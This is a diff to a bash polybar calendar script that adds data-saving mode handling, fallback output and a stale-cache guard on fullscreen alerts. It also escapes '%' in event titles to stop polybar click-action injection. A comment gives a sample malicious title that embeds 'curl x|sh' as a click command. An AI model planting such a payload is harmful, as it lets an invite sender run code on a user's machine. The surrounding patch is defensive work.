@@ -21,10 +21,20 @@ ICON_LIVE="%{T2}󰕧%{T-}"
 ICON_PAUSED="%{T2}󰅤%{T-}"  # nf-md-cloud_off_outline — data saving mode is on
 
 DATASAVE_STATUS="${DATASAVE_STATUS:-$HOME/.config/i3/scripts/datasave-status}"
-datasave_on() { "$DATASAVE_STATUS" is-on 2>/dev/null; }
+# Resolved once: polybar re-execs this script every 30s, and the mode cannot
+# change during one short invocation, so asking more than once only forks again.
+DATASAVE_ON=0
+"$DATASAVE_STATUS" is-on 2>/dev/null && DATASAVE_ON=1
+datasave_on() { (( DATASAVE_ON )); }
 
 GCALCLI="${GCALCLI:-$(command -v gcalcli 2>/dev/null || echo "$HOME/.pyenv/versions/3.12.3/bin/gcalcli")}"
-[[ -x "$GCALCLI" ]] || exit 0
+# Exiting empty would hide the module from the bar entirely; print the marker
+# instead. This path is live: the fallback is a pinned pyenv path, which breaks
+# on an Arch Python major bump.
+if [[ ! -x "$GCALCLI" ]]; then
+    datasave_on && echo "$ICON_PAUSED" || echo "$ICON_NORMAL"
+    exit 0
+fi
 
 # User config: defines GCAL_CAL_ARGS as a bash array of --cal entries.
 # See ~/Documents/Projects/system_settings/home/.config/gcal-next.env.example
@@ -43,7 +53,10 @@ refresh_cache() {
     local force=$1
     # Data saving mode: make no network call. This returns before the day-change
     # branch below, which would otherwise clear the alert directory and refetch.
-    datasave_on && return 0
+    # An explicit right-click still refreshes: suppressing a poll is the point,
+    # overriding a deliberate request is not -- the same choice newsboat makes
+    # for a manual reload.
+    datasave_on && (( ! force )) && return 0
     local today=$(date +%Y-%m-%d)
     local refresh=$force
 
@@ -68,7 +81,12 @@ refresh_cache() {
             echo "$today" > "$CACHE_FILE"
             tail -n +2 "$tmpfile" | while IFS=$'\t' read -r _ start_time _ end_time title; do
                 [[ -z "$start_time" || -z "$title" ]] && continue
-                echo "${start_time} ${end_time} ${title}"
+                # Escape polybar's tag opener at the single point titles enter
+                # the cache. polybar parses %{A1:cmd:} click actions in module
+                # output and runs them through a shell, so an event titled
+                # "%{A1:curl x|sh:}Standup%{A}" -- set by anyone who can send a
+                # meeting invite -- would otherwise arm the bar with a command.
+                echo "${start_time} ${end_time} ${title//%/%%}"
             done >> "$CACHE_FILE"
             if (( force )); then
                 local count=$(( $(wc -l < "$CACHE_FILE") - 1 ))
@@ -147,7 +165,16 @@ fi
 
 # 5-minute fullscreen alert (once per meeting)
 alert_flag="$ALERT_DIR/${start_time}_$(echo "$full_title" | md5sum | cut -c1-8)"
-if (( diff > 0 && diff <= ALERT_MINUTES )) && [[ ! -f "$alert_flag" ]]; then
+# A fullscreen alert is the one path here that takes over the whole screen, and
+# while the mode is on the cache behind it stops being refreshed -- so a meeting
+# cancelled hours ago could still seize the display, with the cancellation
+# invisible precisely because the fetch was suppressed. Same-day is not fresh
+# enough for that; hold the alert to the normal cache-age bound.
+alert_ok=1
+if datasave_on && (( $(date +%s) - $(stat -c %Y "$CACHE_FILE" 2>/dev/null || echo 0) > CACHE_MAX_AGE )); then
+    alert_ok=0
+fi
+if (( alert_ok && diff > 0 && diff <= ALERT_MINUTES )) && [[ ! -f "$alert_flag" ]]; then
     touch "$alert_flag"
     ~/.config/i3/scripts/fullscreen-alert "$full_title" "IN ${diff} MINUTES!" &
 fi
